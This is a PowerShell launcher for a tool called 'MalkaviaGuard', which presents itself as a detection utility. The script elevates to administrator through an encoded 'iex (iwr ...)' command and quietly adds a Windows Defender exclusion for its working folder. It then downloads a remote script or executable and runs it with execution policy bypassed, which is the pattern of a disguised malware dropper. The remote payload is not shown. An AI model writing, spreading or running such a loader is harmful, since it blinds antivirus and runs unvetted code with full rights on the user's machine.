param([switch]$Elevated, [switch]$PowerShell, [switch]$ExeDownload)

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$ScriptUrl = 'https://raw.githubusercontent.com/duaaaalityyyy/MalkaviaGuard/main/run.ps1'
$ExeUrl   = 'https://raw.githubusercontent.com/duaaaalityyyy/MalkaviaGuard/main/MalkaviaGuard.exe'

$WorkDir = Join-Path $env:TEMP 'MalkaviaGuard'
$Dest    = Join-Path $WorkDir 'MalkaviaGuard.exe'
$ScriptPath = Join-Path $WorkDir 'MalkaviaGuard.ps1'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Restart-AsAdministrator {
    Write-Host 'Requesting administrator permissions...' -ForegroundColor Yellow
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(@"
`$ErrorActionPreference = 'Stop'
iex (iwr '$ScriptUrl' -UseBasicParsing)
"@))
    Start-Process powershell.exe -Verb RunAs -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $encodedCommand
}

function Start-PowerShellVersion {
    Write-Host '╔════════════════════════════════════════╗' -ForegroundColor Magenta
    Write-Host '║  MalkaviaGuard v1.0 - PowerShell Mode  ║' -ForegroundColor Magenta
    Write-Host '║  Direct execution (recommended)         ║' -ForegroundColor Magenta
    Write-Host '╚════════════════════════════════════════╝' -ForegroundColor Magenta
    Write-Host ''
    
    Write-Host 'Adding Defender exclusion for MalkaviaGuard...' -ForegroundColor Yellow
    try { Add-MpPreference -ExclusionPath $WorkDir -ErrorAction Stop } catch {}
    
    Write-Host 'Downloading MalkaviaGuard PowerShell script...' -ForegroundColor Cyan
    New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/duaaaalityyyy/MalkaviaGuard/main/MalkaviaGuard.ps1' -OutFile $ScriptPath -UseBasicParsing
    
    Write-Host 'Starting MalkaviaGuard...' -ForegroundColor Green
    & powershell.exe -ExecutionPolicy Bypass -File $ScriptPath
}

function Start-ExeVersion {
    Write-Host '╔════════════════════════════════════════╗' -ForegroundColor Cyan
    Write-Host '║  MalkaviaGuard v1.0 - EXE Mode         ║' -ForegroundColor Cyan
    Write-Host '║  Compiled C++ version                  ║' -ForegroundColor Cyan
    Write-Host '╚════════════════════════════════════════╝' -ForegroundColor Cyan
    Write-Host ''
    
    New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null

    Write-Host 'Adding Defender exclusion for MalkaviaGuard...' -ForegroundColor Yellow
    try { Add-MpPreference -ExclusionPath $WorkDir -ErrorAction Stop } catch {}

    Write-Host 'Downloading MalkaviaGuard.exe...' -ForegroundColor Cyan
    Invoke-WebRequest -Uri $ExeUrl -OutFile $Dest -UseBasicParsing

    Write-Host 'Starting MalkaviaGuard (EXE)...' -ForegroundColor Green
    Start-Process -FilePath $Dest -WorkingDirectory $WorkDir -NoNewWindow
}

try {
    if (-not (Test-IsAdministrator)) {
        Restart-AsAdministrator
        return
    }

    Write-Host ''
    Write-Host 'MalkaviaGuard Launcher' -ForegroundColor Magenta
    Write-Host '=====================================' -ForegroundColor Magenta
    Write-Host ''
    Write-Host '1. PowerShell version (Recommended) - Direct execution, all features enabled'
    Write-Host '2. EXE version - Compiled C++ binary for lower-level detection'
    Write-Host ''
    
    if ($PowerShell) {
        Start-PowerShellVersion
    } elseif ($ExeDownload) {
        Start-ExeVersion
    } else {
        # Default: Run PowerShell version
        Start-PowerShellVersion
    }
}
catch {
    Write-Error "MalkaviaGuard failed: $($_.Exception.Message)"
    exit 1
}
